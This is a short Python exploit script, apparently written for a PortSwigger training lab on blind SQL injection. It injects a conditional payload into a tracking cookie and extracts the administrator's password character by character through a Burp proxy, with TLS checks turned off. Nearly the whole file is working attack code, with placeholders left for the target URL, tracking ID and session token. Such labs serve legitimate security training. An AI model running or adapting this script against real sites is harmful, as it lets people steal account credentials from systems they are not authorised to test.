import sys
import requests
import urllib
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#this script is for portswiggers blind sql lab, condition based
#You need to edit the URL, TrackingID, Session token, and proxy port if your proxy is not on port:8080
def sql_password():
    password_extracted=""
    for n in range(1,21):
        for x in range(32,126):
            payload="' AND (SELECT ascii(substring(password,%s,1)) FROM users WHERE username='administrator')='%s'--" %(n,x)
            encoded_payload=urllib.parse.quote(payload)
            url="PUT URL OF TARGET HERE"
            proxies_burp= {'http': '//127.0.0.1:8080','https': '//127.0.0.1:8080'} 
            cookies_2= {'TrackingId':'PUT TRACKING ID HERE' + encoded_payload,'session':'PUT SESSION TOKEN HERE'}
                                                                #proxies=urllib.request.getproxies()   can also use this instead
            r=requests.get(url, cookies=cookies_2, verify=False, proxies=proxies_burp)

            if "Welcome" not in r.text:
                sys.stdout.write("\r" + password_extracted + chr(x))
                sys.stdout.flush()
            else:
                password_extracted +=chr(x)
                sys.stdout.write("\r" + password_extracted)
                sys.stdout.flush()
                break

sql_password()
print()

